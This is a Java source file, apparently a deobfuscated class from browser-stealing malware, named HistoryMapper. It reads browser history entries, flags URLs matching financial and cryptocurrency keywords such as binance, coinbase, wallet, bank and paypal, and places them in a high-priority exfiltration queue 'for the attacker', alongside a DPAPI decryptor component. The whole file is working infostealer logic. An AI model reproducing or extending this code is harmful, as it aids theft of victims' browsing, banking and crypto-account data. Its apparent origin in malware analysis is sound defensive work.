import java.sql.ResultSet;

/**
 * Cleaned HistoryMapper (formerly ë.java)
 * Extracts browser history and bookmarks.
 * It prioritizes financial and cryptocurrency-related URLs for the attacker.
 */
public class HistoryMapper implements DataMapper {
    private final BrowserStats stats;
    private final DPAPIDecryptor decryptor;
    private final ExfiltrationQueue queue;
    private final String browserProfile;

    public HistoryMapper(BrowserStats stats, DPAPIDecryptor decryptor, ExfiltrationQueue queue, String profile) {
        this.stats = stats;
        this.decryptor = decryptor;
        this.queue = queue;
        this.browserProfile = profile;
    }

    @Override
    public String mapRow(ResultSet rs) throws Exception {
        this.stats.totalHistoryEntries++;

        String title = rs.getString("title");
        String url = rs.getString("url");
        
        // Decoded string keywords for filtering
        String[] targetKeywords = {"binance", "coinbase", "crypto", "wallet", "bank", "paypal", "login"};

        boolean isPriority = false;
        String urlLower = url.toLowerCase();
        
        for (String keyword : targetKeywords) {
            if (urlLower.contains(keyword)) {
                isPriority = true;
                break;
            }
        }

        String entry = String.format("\nTitle: %s | URL: %s", title, url);

        if (isPriority) {
            // Add to high-priority exfiltration queue if it's a financial site
            this.queue.priorityUrls.offer(entry);
            this.stats.priorityEntriesFound++;
        }

        return entry;
    }
}
